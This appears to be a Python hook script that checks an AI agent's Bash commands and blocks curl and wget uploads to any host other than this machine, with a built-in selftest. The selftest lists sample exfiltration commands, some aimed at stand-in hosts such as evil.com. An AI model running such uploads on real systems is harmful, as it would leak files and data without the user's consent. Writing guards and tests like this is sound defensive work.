#!/usr/bin/env python3
"""PreToolUse(Bash): block curl and wget when they send data out of the machine.

The repositories under ~/Work denied `Bash(curl:*)` outright, which also blocked every read:
measured on 2026-09-24, a session could not fetch CodeRabbit's public schema. A prefix rule
cannot tell a GET from an upload, and the user asked for the deny to go while uploads stay
blocked. So the read passes and the send is refused here, in every repository and every pane.

What counts as a send is a flag that puts a body, a form, a file or a writing method on the
request. A plain GET with headers passes: a header can carry a token, but a token alone moves
no file.

A send whose every target is this machine passes: 127.0.0.0/8, localhost or [::1]. The user
allowed it on 2026-09-29 so a session can POST to services it runs locally; one target on any
other host keeps the call blocked, and a call with no readable target stays blocked too.

The calls come from `shell.py`, the shephrd plugin's parser, linked beside this file by chezmoi,
so a send inside `bash -c "..."` or `$(...)` is read, and text that names curl is not a call.
Measured on 2026-09-30 against the split alone: both of those sends passed. A line the parser
declines keeps `segments()`: no `shfmt`, no plugin, a parse error, or a call whose arguments are
only known after expansion or arrive on stdin.

Exit 2 names the flag that tripped it, so the next attempt is either a read or a question to
the user.

Self-check: python3 block-uploads.py --selftest
"""
import ipaddress
import json
import os
import re
import shlex
import sys
from pathlib import Path
from urllib.parse import urlsplit

sys.path.insert(0, str(Path(__file__).resolve().parent))
try:
    from hookaudit import record
except ImportError:
    def record(*_a, **_k):
        return False

# A dangling link or a broken module must never fail the hook: it falls back to `segments()`.
try:
    import shell
except Exception:
    shell = None

CURL_SEND = ("-d", "--data", "-F", "--form", "-T", "--upload-file", "--json")
WGET_SEND = ("--post-data", "--post-file", "--body-data", "--body-file")
WRITE_METHODS = {"POST", "PUT", "PATCH", "DELETE"}
# A bare token that could name a host: `evil.com`, `127.0.0.1:8010/x`. Bodies (`a=1`, `{...}`)
# and files given as `@f` never match; a file name with a dot does, which blocks, the safe side.
BARE_HOST = re.compile(r"^[\w.-]+(:\d+)?(/.*)?$")
VALUE_FLAGS = {"-H", "--header", "-o", "--output", "-X", "--request", "--method"}


def segments(command):
    """Split a command line on `;`, `&`, `|` and newlines outside quotes.

    A `;` inside `-F "file=@x;type=application/pdf"` is part of the argument; splitting on it
    cut the curl call in two and failed its loopback check.
    """
    out, cur, quote, i = [], [], None, 0
    while i < len(command):
        ch = command[i]
        if quote:
            cur.append(ch)
            if ch == "\\" and quote == '"' and i + 1 < len(command):
                cur.append(command[i + 1])
                i += 1
            elif ch == quote:
                quote = None
        elif ch == "\\" and i + 1 < len(command):
            cur.append(ch + command[i + 1])
            i += 1
        elif ch in "'\"":
            quote = ch
            cur.append(ch)
        elif ch in ";&|\n":
            out.append("".join(cur))
            cur = []
        else:
            cur.append(ch)
        i += 1
    out.append("".join(cur))
    return out


def is_loopback(host):
    if not host:
        return False
    if host == "localhost":
        return True
    try:
        return ipaddress.ip_address(host).is_loopback
    except ValueError:
        return False


def local_only(args):
    """True when every target in the arguments is this machine, and there is at least one."""
    targets, skip = [], False
    for w in args:
        if skip:
            skip = False
            continue
        if w in VALUE_FLAGS:
            skip = True
            continue
        if w.startswith("-") or w.startswith("@"):
            continue
        if "://" in w:
            targets.append(w)
        elif BARE_HOST.match(w) and ("." in w or ":" in w or w.startswith("localhost")):
            targets.append("http://" + w)
    if not targets:
        return False
    for t in targets:
        try:
            host = urlsplit(t).hostname
        except ValueError:
            return False
        if not is_loopback(host):
            return False
    return True


def sends(words):
    """The flag that makes this curl or wget call send data, or None."""
    if not words:
        return None
    tool = Path(words[0]).name
    if tool not in ("curl", "wget"):
        return None
    args = words[1:]
    for i, w in enumerate(args):
        if tool == "curl":
            if w.startswith("--"):
                name, _, value = w.partition("=")
                if name.startswith(CURL_SEND[1]) or name in CURL_SEND[2:]:
                    return name
                if name == "--request":
                    method = value or (args[i + 1] if i + 1 < len(args) else "")
                    if method.upper() in WRITE_METHODS:
                        return f"--request {method}"
            elif w.startswith("-") and len(w) > 1:
                # Short flags combine, `-sd` or `-XPOST`: the letter decides, not the token.
                letters = w[1:]
                for j, ch in enumerate(letters):
                    if ch in "dFT":
                        return f"-{ch}"
                    if ch == "X":
                        method = letters[j + 1:] or (args[i + 1] if i + 1 < len(args) else "")
                        if method.upper() in WRITE_METHODS:
                            return f"-X {method}"
                        break
        else:
            name, _, value = w.partition("=")
            if name in WGET_SEND:
                return name
            if name == "--method":
                method = value or (args[i + 1] if i + 1 < len(args) else "")
                if method.upper() in WRITE_METHODS:
                    return f"--method {method}"
    return None


def _reason(words, flag):
    return (f"Blocked: `{Path(words[0]).name} {flag}` sends data out of this machine. "
            "Reads with curl and wget are allowed; an upload, a form, a body or a "
            "writing method needs the user, so ask them instead.")


def parsed_verdict(command):
    """The reason to block from the parsed commands, "" for none, or None when the parser
    declines: no `shfmt` or `shell.py`, a parse error, or a curl or wget whose arguments are
    only known after expansion or arrive on stdin."""
    if shell is None:
        return None
    try:
        cmds = shell.commands(command)
    except Exception:
        return None
    if cmds is None:
        return None
    for c in cmds:
        if Path(c.argv[0]).name not in ("curl", "wget"):
            continue
        if c.stdin or None in c.argv:
            return None
        flag = sends(c.argv)
        if flag and not local_only(c.argv[1:]):
            return _reason(c.argv, flag)
    return ""


def verdict(command):
    """The reason to block, or None when every curl and wget call only reads."""
    command = command or ""
    if "curl" not in command and "wget" not in command:
        return None
    parsed = parsed_verdict(command)
    if parsed is not None:
        return parsed or None
    for segment in segments(command):
        try:
            words = shlex.split(segment)
        except ValueError:
            words = segment.split()
        # A prefix such as `sudo`, `env X=1` or `timeout 5` does not change what the call sends.
        while words and (words[0] in ("sudo", "env", "command", "exec", "timeout", "rtk", "proxy")
                         or "=" in words[0] or words[0].isdigit()):
            words = words[1:]
        flag = sends(words)
        if flag and not local_only(words[1:]):
            return _reason(words, flag)
    return None


def main():
    try:
        event = json.load(sys.stdin)
    except (json.JSONDecodeError, ValueError, EOFError):
        return 0
    if event.get("tool_name") != "Bash":
        return 0
    reason = verdict((event.get("tool_input") or {}).get("command", ""))
    if not reason:
        return 0
    record("block-uploads", "block", event["tool_input"]["command"][:200])
    print(reason, file=sys.stderr)
    return 2


def selftest():
    global record
    record = lambda *_a, **_k: False
    u = "https://example.com/x"
    for cmd in [f"curl -d a=1 {u}", f"curl --data-binary @f {u}", f"curl -F file=@f {u}",
                f"curl -T f {u}", f"curl --upload-file f {u}", f"curl -X POST {u}",
                f"curl -XPUT {u}", f"curl --request=DELETE {u}", f"curl -sd a {u}",
                f"curl --json '{{}}' {u}", f"wget --post-data a=1 {u}",
                f"wget --method=PUT {u}", f"ls | curl -d @- {u}", f"sudo curl -d a {u}",
                f"/usr/bin/curl -d a {u}", f"cat f; curl -F x=@f {u}",
                "curl -X POST http://127.0.0.1.evil.com/x", "curl -d a http://localhost@evil.com/",
                f"curl -d a http://127.0.0.1:8010/x {u}", "curl -d localhost evil.com",
                "curl -X POST -d a", "wget --post-data a=1 http://10.0.0.1/x",
                "curl -d a http://[::2]/x",
                f"curl -s -X POST \"{u}\" -F \"file=@/tmp/x.pdf;type=application/pdf\""]:
        assert verdict(cmd), cmd
    for cmd in [f"curl -sL {u}", f"curl -H 'Accept: x' {u}", f"curl -X GET {u}",
                f"curl -o out {u}", f"wget -q {u}", "echo curl -d", "git commit -m 'curl -d'",
                f"curl -I {u}", "ls -d /tmp",
                "curl -X POST http://127.0.0.1:8010/api", "curl -d a=1 http://localhost:8081/p",
                "curl --json '{}' http://[::1]:8090/x", "curl -XPOST 127.0.0.2:8090/x",
                "wget --post-data a=1 http://localhost/x",
                "curl -X POST -H 'Content-Type: application/json' -d @body http://127.0.0.1:8010/x",
                'curl -s -X POST "http://127.0.0.1:8010/portal/t/upload" '
                '-F "file=@/tmp/x.pdf;type=application/pdf"',
                'curl -s -X POST "http://127.0.0.1:8010/portal/t/upload" '
                '-H "Content-Type: multipart/form-data; boundary=x" --data-binary @/tmp/b.bin']:
        assert not verdict(cmd), cmd

    # Rows measured on 2026-09-30. With the parser, a send inside `sh -c` or `$(...)` is read,
    # and a `;` inside quotes never splits a call; without it, `segments()` answers as before.
    e = "https://example.com"
    for cmd in [f"curl -d a {e}", f"echo x; curl -F f=@x {e}", f'curl -F "f=@x;type=text/plain" {e}',
                f"curl -d a http://127.0.0.1:8010/x {e}", f"curl -d a `echo {u}`"]:
        assert verdict(cmd), cmd
    for cmd in [f'echo "done; curl -d a {e}"', f"printf '%s\\n' 'a;curl -F f=@x {e}'",
                "curl -X POST http://127.0.0.1:8010/api", "ls | grep curl"]:
        assert not verdict(cmd), cmd
    parsed = [f'bash -c "curl -d a {e}"', f"echo $(curl -d a {e})", f"sh -c 'curl -d a {u}'",
              f"x=$(curl -d @f {u})", f"timeout 5 curl -T f {u}", f"cat <<'EOF' | sh\ncurl -d a {u}\nEOF"]
    skipped = 0
    if shell is not None and shell.available():
        for cmd in parsed:
            assert verdict(cmd), cmd
        # Heredoc text is data; the split reads each of its lines as a call.
        assert not verdict(f"cat <<'EOF'\ncurl -d a {e}\nEOF")
        # Arguments only known after expansion, or read from stdin, keep the fallback verdict.
        for cmd in [f"curl $FLAGS {u}", f"echo {u} | xargs curl -d a"]:
            assert parsed_verdict(cmd) is None, cmd
    else:
        skipped = len(parsed) + 3

    # With `shell` absent from sys.path the hook runs `segments()`: a copy alone in a directory.
    import subprocess
    import tempfile
    with tempfile.TemporaryDirectory() as alone:
        copy = Path(alone, "block-uploads.py")
        copy.write_text(Path(__file__).read_text())
        for cmd, code in [(f"curl -d a {e}", 2), (f'bash -c "curl -d a {e}"', 0),
                          ("curl -X POST http://127.0.0.1:8010/api", 0)]:
            p = subprocess.run([sys.executable, str(copy)], capture_output=True, text=True,
                               env={"PATH": os.environ.get("PATH", "")},
                               input=json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}}))
            assert p.returncode == code, (cmd, p.returncode, p.stderr)
    print("block-uploads selftest ok" +
          (f" ({skipped} parser rows skipped: no shfmt or no shell.py)" if skipped else ""))
    return 0


if __name__ == "__main__":
    sys.exit(selftest() if "--selftest" in sys.argv else main())
